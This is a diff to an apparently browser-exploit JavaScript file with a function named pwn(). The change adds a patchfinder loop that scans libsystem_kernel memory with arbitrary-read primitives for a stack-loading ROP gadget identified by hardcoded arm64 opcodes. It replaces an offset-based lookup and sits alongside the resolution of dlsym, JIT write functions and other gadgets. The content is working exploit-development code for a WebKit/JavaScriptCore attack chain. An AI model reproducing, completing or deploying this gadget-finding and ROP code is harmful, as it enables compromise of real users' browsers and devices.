@@ -493,6 +493,9 @@ function pwn() {
     var dlsym_addr = find_symbol_address(libdyld_base, "__dlsym");
     log(`[+] dlsym: ${dlsym_addr}`);
 
+    //TEMPORARY DISABLED START
+    var temp_disabled = false;
+    if(!temp_disabled) {
     var jitWriteSeparateHeaps_addr = find_symbol_address(jsc_base, "___ZN3JSC29jitWriteSeparateHeapsFunctionE");
     log(`[+] jitWriteSeparateHeaps: ${jitWriteSeparateHeaps_addr}`);
 
@@ -514,6 +517,47 @@ function pwn() {
     var __MergedGlobals_52_addr = follow_adrpLdr(Add(jsc_base, startOfFixedExecutableMemoryPoolImpl_addr));
     __MergedGlobals_52_addr = Sub(__MergedGlobals_52_addr, jsc_base);
     log(`[+] __MergedGlobals_52: ${__MergedGlobals_52_addr}`);
+    }
+    //TEMPORARY DISABLED END
+
+    
+    
+    //FIND GADGETS...
+    var mach_vm_map_addr = find_symbol_address(libsystem_kernel_base, "__mach_vm_map");
+    log(`[+] mach_vm_map: ${mach_vm_map_addr}`);
+    try_count = 0;
+    var stackloader = Add(libsystem_kernel_base, mach_vm_map_addr);
+    while (true) {
+        if(try_count > 100) {
+            log(`[-] failed webkit patchfinder`);
+            return;
+        }
+
+        // libsystem_kernel:__text:0000000180A61720 FD 7B 46 A9                             LDP             X29, X30, [SP,#0x60+var_s0]
+        // libsystem_kernel:__text:0000000180A61724 F4 4F 45 A9                             LDP             X20, X19, [SP,#0x60+var_10]
+        // libsystem_kernel:__text:0000000180A61728 F6 57 44 A9                             LDP             X22, X21, [SP,#0x60+var_20]
+        // libsystem_kernel:__text:0000000180A6172C F8 5F 43 A9                             LDP             X24, X23, [SP,#0x60+var_30]
+        // libsystem_kernel:__text:0000000180A61730 FA 67 42 A9                             LDP             X26, X25, [SP,#0x60+var_40]
+        // libsystem_kernel:__text:0000000180A61734 FC 6F 41 A9                             LDP             X28, X27, [SP,#0x60+var_50]
+        // libsystem_kernel:__text:0000000180A61738 FF C3 01 91                             ADD             SP, SP, #0x70 ; 'p'
+        // libsystem_kernel:__text:0000000180A6173C C0 03 5F D6                             RET
+        opcode = read64(stackloader);
+        opcode2 = read64(Add(stackloader, 0x8))
+        opcode3 = read64(Add(stackloader, 0x10))
+        opcode4 = read64(Add(stackloader, 0x18))
+        if(opcode == 0xA9454FF4A9467BFD && opcode2 == 0xA9435FF8A94457F6 && opcode3 == 0xA9416FFCA94267FA && opcode4 == 0xD65F03C09101C3FF) {
+            break;
+        }
+        stackloader = Add(stackloader, 0x8);
+        try_count++;
+    }
+
+    log(`[+] stackloader: ${stackloader}`);
+
+    // return;
+
+
+
 
     //fail
     // var __ZZ6dlopenE1p_addr = find_symbol_address(libdyld_base, "__ZZ6dlopenE1p");
@@ -557,7 +601,7 @@ function pwn() {
 
 
     //gadgets
-    var stackloader = Add(webcore_base, offsets.stackloader); //v FD 7B 46 A9 F4 4F 45 A9 F6 57 44 A9 F8 5F 43 A9 FA 67 42 A9 FC 6F 41 A9 FF C3 01 91 C0 03 5F D6 
+    // var stackloader = Add(webcore_base, offsets.stackloader); //v FD 7B 46 A9 F4 4F 45 A9 F6 57 44 A9 F8 5F 43 A9 FA 67 42 A9 FC 6F 41 A9 FF C3 01 91 C0 03 5F D6 
     var ldrx8 = Add(webcore_base, offsets.ldrx8);    //v E8 03 40 F9 68 02 00 F9 FD 7B 42 A9 F4 4F 41 A9 FF C3 00 91 C0 03 5F D6 
     var dispatch = Add(coreaudio_base, offsets.dispatch)   //v A0 02 3F D6 FD 7B 43 A9 F4 4F 42 A9 F6 57 41 A9 FF 03 01 91 C0 03 5F D6
     var movx4 = Add(webcore_base, offsets.movx4);    //v E4 03 14 AA 00 01 3F D6 
